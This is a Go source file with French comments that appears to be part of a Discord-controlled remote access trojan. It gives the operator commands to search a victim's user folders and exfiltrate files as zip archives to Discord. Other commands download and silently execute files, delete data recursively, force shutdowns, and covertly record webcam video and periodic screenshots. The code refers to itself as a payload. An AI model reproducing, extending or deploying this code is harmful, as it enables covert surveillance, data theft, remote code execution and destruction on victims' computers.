// fileops.go — opérations fichiers : recherche, upload (zip), download, exec, delete, shutdown.
package main

import (
	"archive/zip"
	"bytes"
	"context"
	"fmt"
	"image"
	_ "image/jpeg"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)

// searchFiles cherche des fichiers par mot-clé (nom) et exfiltre les résultats.
func searchFiles(pattern string, maxResults int) string {
	if pattern == "" {
		return "usage : !search <motif> [max]"
	}
	if maxResults <= 0 {
		maxResults = 50
	}

	var results []string
	roots := []string{
		os.Getenv("USERPROFILE"),
		os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH"),
		"C:\\Users",
	}
	seen := make(map[string]bool)

	for _, root := range roots {
		if root == "" {
			continue
		}
		filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			if err != nil || len(results) >= maxResults {
				return nil
			}
			if info.IsDir() {
				// Ignorer dossiers système/gros
				base := strings.ToLower(info.Name())
				if base == "windows" || base == "program files" || base == "program files (x86)" ||
					base == "appdata" || base == "temp" || base == "recycle.bin" {
					return filepath.SkipDir
				}
				return nil
			}
			if strings.Contains(strings.ToLower(info.Name()), strings.ToLower(pattern)) {
				if !seen[path] {
					seen[path] = true
					results = append(results, fmt.Sprintf("%s (%d octets)", path, info.Size()))
				}
			}
			return nil
		})
		if len(results) >= maxResults {
			break
		}
	}

	if len(results) == 0 {
		return "aucun fichier trouvé pour '" + pattern + "'"
	}
	var b strings.Builder
	b.WriteString(fmt.Sprintf("Résultats pour '%s' (max %d) :\n", pattern, maxResults))
	for _, r := range results {
		b.WriteString("  " + r + "\n")
	}
	return b.String()
}

// zipAndUpload crée un ZIP d'un fichier/dossier et l'envoie sur Discord.
func zipAndUpload(target string) string {
	if target == "" {
		return "usage : !download <fichier|dossier>"
	}
	target = filepath.Clean(target)
	_, err := os.Stat(target)
	if err != nil {
		return "erreur : " + err.Error()
	}

	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	base := filepath.Base(target)

	err = filepath.Walk(target, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		rel, _ := filepath.Rel(filepath.Dir(target), path)
		if rel == "." {
			rel = base
		}
		if info.IsDir() {
			_, _ = zw.Create(rel + "/")
			return nil
		}
		f, err := os.Open(path)
		if err != nil {
			return err
		}
		defer f.Close()
		w, err := zw.Create(rel)
		if err != nil {
			return err
		}
		_, err = io.Copy(w, f)
		return err
	})
	if err != nil {
		return "erreur zip : " + err.Error()
	}
	_ = zw.Close()

	if buf.Len() > 8*1024*1024 {
		return fmt.Sprintf("archive trop grosse (%d Mo) : limite 8 Mo", buf.Len()/1024/1024)
	}

	discordUploadToChannel(fileOut{Name: base + ".zip", Data: buf.Bytes()})
	return "archive envoyée : " + base + ".zip (" + fmt.Sprintf("%.1f", float64(buf.Len())/1024/1024) + " Mo)"
}

// uploadFromURL télécharge un fichier depuis une URL vers le disque local.
func uploadFromURL(urlStr, dest string) string {
	if urlStr == "" || dest == "" {
		return "usage : !upload <url> <destination>"
	}
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	req, _ := http.NewRequestWithContext(ctx, "GET", urlStr, nil)
	req.Header.Set("User-Agent", discordUA)
	resp, err := httpc.Do(req)
	if err != nil {
		return "erreur téléchargement : " + err.Error()
	}
	defer resp.Body.Close()

	if err := os.MkdirAll(filepath.Dir(dest), 0755); err != nil {
		return "erreur dossier : " + err.Error()
	}
	f, err := os.Create(dest)
	if err != nil {
		return "erreur création : " + err.Error()
	}
	defer f.Close()
	n, err := io.Copy(f, resp.Body)
	if err != nil {
		return "erreur écriture : " + err.Error()
	}
	return fmt.Sprintf("téléchargé : %s (%d octets)", dest, n)
}

// execFile exécute un fichier local avec arguments.
func execFile(path, args string) string {
	if path == "" {
		return "usage : !exec <fichier> [args]"
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, path)
	if args != "" {
		cmd.Args = append(cmd.Args, strings.Fields(args)...)
	}
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	out, err := cmd.CombinedOutput()
	if err != nil && len(out) == 0 {
		return "erreur : " + err.Error()
	}
	return truncate(string(out), maxOutputRun)
}

// deletePath supprime un fichier ou dossier (récursif).
func deletePath(target string) string {
	if target == "" {
		return "usage : !delete <fichier|dossier>"
	}
	target = filepath.Clean(target)
	if err := os.RemoveAll(target); err != nil {
		return "erreur suppression : " + err.Error()
	}
	return "supprimé : " + target
}

// shutdownPC éteint ou redémarre la machine.
func shutdownPC(restart bool, timeoutSec int) string {
	if timeoutSec < 0 {
		timeoutSec = 0
	}
	action := "/s"
	if restart {
		action = "/r"
	}
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "shutdown.exe", action, "/t", fmt.Sprintf("%d", timeoutSec), "/f")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	if err := cmd.Run(); err != nil {
		return "erreur shutdown : " + err.Error()
	}
	actionStr := "éteint"
	if restart {
		actionStr = "redémarre"
	}
	return fmt.Sprintf("PC %s dans %d secondes (forcé).", actionStr, timeoutSec)
}

// webcamRecord produit une vidéo MJPEG (.avi) sans dépendance : une webcam
// rend du JPEG, on assemble les images dans un conteneur AVI. La cadence
// dépend de la vitesse réelle de capture (PowerShell/WinRT réinitialise la
// caméra à chaque photo) : compter 1 à 2 images par seconde.
func webcamRecord(seconds int) string {
	if seconds <= 0 || seconds > 300 {
		return "usage : !webcamrec <secondes 1-300>"
	}
	if stopped.Load() {
		return "payload arrêté."
	}
	// Deux images par seconde visées, plafonnées à 120 images (taille Discord).
	count := seconds * 2
	if count > 120 {
		count = 120
	}
	dir := workPath(fmt.Sprintf("camrec-%d", time.Now().Unix()))
	_ = os.RemoveAll(dir)
	n, err := webcamCaptureSeries(dir, count, 500)
	if err != nil {
		_ = os.RemoveAll(dir)
		return "capture vidéo impossible : " + err.Error()
	}
	frames := seriesFrames(dir)
	_ = os.RemoveAll(dir)
	if len(frames) == 0 {
		return "aucune image récupérée."
	}

	w, h := 0, 0
	if cfgImg, _, err := image.DecodeConfig(bytes.NewReader(frames[0])); err == nil {
		w, h = cfgImg.Width, cfgImg.Height
	}
	if w == 0 || h == 0 {
		w, h = 640, 480
	}
	// Cadence réelle : images obtenues / durée, bornée à 30 fps.
	fps := n / seconds
	if fps < 1 {
		fps = 1
	}
	if fps > 30 {
		fps = 30
	}
	avi := newAVIWriter(w, h, fps, len(frames))
	for _, f := range frames {
		avi.add(f)
	}
	data, err := avi.build()
	if err != nil {
		return "assemblage vidéo impossible : " + err.Error()
	}
	if len(data) > 8*1024*1024 {
		return fmt.Sprintf("vidéo trop lourde (%d Mo) : réduis la durée.", len(data)/1024/1024)
	}
	name := fmt.Sprintf("cam-%s.avi", time.Now().Format("060102-150405"))
	sendFilesTo(webcamChannel(), fileOut{Name: name, Data: data})
	return fmt.Sprintf("vidéo envoyée : %s (%d images, %d s).", name, n, seconds)
}

// scheduledScreenshots capture à intervalle donné (secondes) et pousse chaque
// prise dans le salon des captures. monitorIdx = -1 pour tous les écrans.
func scheduledScreenshots(intervalSec, monitorIdx, count int) string {
	if intervalSec <= 0 {
		return "usage : !screenshot <intervalle_s> [moniteur] [count]"
	}
	if count <= 0 {
		count = 10
	}
	if count > 500 {
		count = 500
	}
	sent := 0
	for i := 0; i < count; i++ {
		if stopped.Load() {
			break
		}
		shots := shotsNow()
		if monitorIdx >= 0 && monitorIdx < len(shots) {
			shots = shots[monitorIdx : monitorIdx+1]
		}
		if _, n := sendShots(fmt.Sprintf("programmée %d/%d", i+1, count), shots); n > 0 {
			sent += n
		}
		time.Sleep(time.Duration(intervalSec) * time.Second)
	}
	return fmt.Sprintf("%d capture(s) envoyée(s) toutes les %d s.", sent, intervalSec)
}
